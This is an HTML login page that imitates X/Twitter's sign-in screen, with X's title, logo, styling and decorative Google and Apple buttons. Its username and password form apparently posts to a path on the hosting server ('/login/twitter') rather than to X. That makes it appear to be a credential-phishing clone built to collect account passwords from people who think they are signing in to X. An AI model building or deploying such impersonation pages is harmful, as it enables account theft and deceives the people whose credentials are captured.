<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Log in to X / Twitter</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-color: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .container {
            width: 90%;
            max-width: 600px;
            padding: 20px;
        }
        .logo {
            text-align: center;
            margin-bottom: 20px;
        }
        .logo img {
            width: 40px;
        }
        .login-form {
            margin-top: 20px;
        }
        h1 {
            font-size: 31px;
            font-weight: 700;
            margin-bottom: 20px;
            color: #0f1419;
        }
        .form-group {
            margin-bottom: 20px;
        }
        .form-control {
            width: 100%;
            padding: 12px;
            font-size: 15px;
            border: 1px solid #cfd9de;
            border-radius: 4px;
            box-sizing: border-box;
        }
        .form-control:focus {
            border-color: #1da1f2;
            outline: none;
            box-shadow: 0 0 0 2px rgba(29, 161, 242, 0.2);
        }
        label {
            display: block;
            font-size: 15px;
            font-weight: 400;
            color: #536471;
            margin-bottom: 8px;
        }
        .login-btn {
            background-color: #000;
            color: white;
            border: none;
            border-radius: 50px;
            font-size: 15px;
            font-weight: 700;
            padding: 12px;
            width: 100%;
            cursor: pointer;
            margin-top: 12px;
        }
        .login-btn:hover {
            background-color: #333;
        }
        .forgot-password {
            color: #1da1f2;
            text-decoration: none;
            font-size: 13px;
            display: block;
            margin-top: 16px;
            text-align: center;
        }
        .signup-text {
            margin-top: 40px;
            font-size: 15px;
            color: #536471;
            text-align: center;
        }
        .signup-link {
            color: #1da1f2;
            text-decoration: none;
            font-weight: 700;
        }
        .divider {
            display: flex;
            align-items: center;
            margin: 20px 0;
        }
        .divider-line {
            background-color: #ebeef0;
            height: 1px;
            flex-grow: 1;
        }
        .divider-text {
            color: #536471;
            font-size: 15px;
            margin: 0 12px;
        }
        .social-login {
            display: flex;
            justify-content: center;
            margin-top: 16px;
        }
        .social-btn {
            background-color: white;
            border: 1px solid #cfd9de;
            border-radius: 50px;
            padding: 10px 20px;
            font-size: 14px;
            font-weight: 700;
            color: #0f1419;
            display: flex;
            align-items: center;
            cursor: pointer;
            margin: 0 8px;
        }
        .social-btn img {
            width: 18px;
            margin-right: 8px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <img src="https://abs.twimg.com/responsive-web/client-web/icon-svg.168b89d5.svg" alt="X logo">
        </div>
        
        <h1>Sign in to X</h1>
        
        <div class="social-login">
            <button class="social-btn">
                <img src="https://www.google.com/favicon.ico" alt="Google">
                Sign in with Google
            </button>
            <button class="social-btn">
                <img src="https://www.apple.com/favicon.ico" alt="Apple">
                Sign in with Apple
            </button>
        </div>
        
        <div class="divider">
            <div class="divider-line"></div>
            <div class="divider-text">or</div>
            <div class="divider-line"></div>
        </div>
        
        <div class="login-form">
            <form action="/login/twitter" method="POST">
                <div class="form-group">
                    <label for="username">Phone, email, or username</label>
                    <input type="text" id="username" name="username" class="form-control" required>
                </div>
                
                <div class="form-group">
                    <label for="password">Password</label>
                    <input type="password" id="password" name="password" class="form-control" required>
                </div>
                
                <button type="submit" class="login-btn">Sign in</button>
            </form>
            
            <a href="#" class="forgot-password">Forgot password?</a>
        </div>
        
        <p class="signup-text">
            Don't have an account? <a href="#" class="signup-link">Sign up</a>
        </p>
    </div>
</body>
</html>
